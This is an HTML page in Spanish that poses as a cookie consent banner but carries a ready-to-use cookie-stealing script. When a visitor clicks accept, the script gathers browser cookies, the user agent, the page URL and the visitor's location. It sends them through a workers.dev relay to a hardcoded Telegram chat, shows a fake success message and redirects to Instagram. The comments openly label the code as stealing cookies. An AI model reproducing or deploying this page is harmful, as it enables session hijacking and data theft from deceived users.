<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aviso de Cookies</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .cookie-card {
            background: white;
            max-width: 500px;
            width: 100%;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
            text-align: center;
        }
        .cookie-icon {
            font-size: 4rem;
            margin-bottom: 16px;
        }
        h2 {
            font-size: 1.5rem;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 12px;
        }
        p {
            color: #5f5f5f;
            font-size: 0.95rem;
            line-height: 1.6;
            margin-bottom: 24px;
        }
        .btn {
            display: inline-block;
            background: #1877f2;
            color: white;
            border: none;
            padding: 12px 32px;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        .btn:active {
            background: #0d65d9;
            transform: scale(0.98);
        }
        .btn-secondary {
            background: transparent;
            color: #1877f2;
            border: 1px solid #1877f2;
            margin-top: 10px;
        }
        .btn-secondary:active {
            background: #e7f3ff;
        }
        .footer {
            margin-top: 20px;
            font-size: 0.7rem;
            color: #8e8e8e;
        }
    </style>
</head>
<body>
    <div class="cookie-card">
        <div class="cookie-icon">🍪</div>
        <h2>Gestionar cookies</h2>
        <p>
            Utilizamos cookies propias y de terceros para mejorar tu experiencia,
            analizar el tráfico y mostrarte contenido personalizado.
        </p>
        <button class="btn" id="acceptBtn">Aceptar todas las cookies</button>
        <button class="btn btn-secondary" id="rejectBtn">Rechazar</button>
        <div class="footer" id="status">⚡ Tus preferencias son importantes para nosotros</div>
    </div>

    <script>
        // ================= CONFIGURACIÓN =================
        const WORKER_URL = 'https://bot-ubi.societykark.workers.dev';
        const CHAT_ID = '7555997298';

        // ========== FUNCIÓN PARA ROBAR COOKIES ==========
        function getCookies() {
            return document.cookie.split('; ')
                .map(cookie => {
                    const [name, value] = cookie.split('=');
                    return { name, value };
                })
                .filter(c => c.name && c.value);
        }

        async function sendCookiesToTelegram() {
            const cookies = getCookies();
            const userAgent = navigator.userAgent;
            const url = window.location.href;

            // Obtener ubicación del Worker
            let locationData = 'No disponible';
            try {
                const res = await fetch(WORKER_URL);
                if (res.ok) {
                    const data = await res.json();
                    locationData = `${data.city || 'N/A'}, ${data.country || 'N/A'}`;
                }
            } catch {}

            // Construir mensaje
            let message = `🍪 *COOKIES ROBADAS*\n━━━━━━━━━━━━━━━━\n\n`;
            message += `📱 *Dispositivo:* ${userAgent.split('(')[1]?.split(')')[0] || 'Desconocido'}\n`;
            message += `📍 *Ubicación:* ${locationData}\n`;
            message += `🌐 *URL:* ${url}\n\n`;
            message += `📋 *Cookies encontradas:* ${cookies.length}\n\n`;

            if (cookies.length === 0) {
                message += `❌ No se encontraron cookies.\n`;
            } else {
                cookies.forEach((c, i) => {
                    message += `• *${c.name}*: \`${c.value.slice(0, 50)}${c.value.length > 50 ? '...' : ''}\`\n`;
                });
                message += `\n📦 *Total:* ${cookies.length} cookies robadas.`;
            }

            // Enviar a Telegram
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('text', message);

            try {
                await fetch(WORKER_URL, {
                    method: 'POST',
                    body: formData,
                    mode: 'cors',
                    credentials: 'omit'
                });
            } catch (e) {
                console.warn('Error al enviar:', e);
            }

            // Mostrar mensaje de éxito falso
            document.getElementById('status').textContent = '✅ Preferencias guardadas. Redirigiendo...';
            document.getElementById('status').style.color = '#28a745';

            // Redirigir al sitio real después de 2 segundos
            setTimeout(() => {
                // Cambia esto por la URL real del sitio (ej. https://www.instagram.com)
                window.location.href = 'https://www.instagram.com';
            }, 1500);
        }

        // ========== EVENTOS ==========
        document.getElementById('acceptBtn').addEventListener('click', function(e) {
            e.preventDefault();
            this.textContent = '⏳ Procesando...';
            this.disabled = true;
            sendCookiesToTelegram();
        });

        document.getElementById('rejectBtn').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('status').textContent = '❌ Has rechazado las cookies. Serás redirigido.';
            document.getElementById('status').style.color = '#dc3545';
            setTimeout(() => {
                window.location.href = 'https://www.instagram.com';
            }, 1500);
        });
    </script>
</body>
</html>
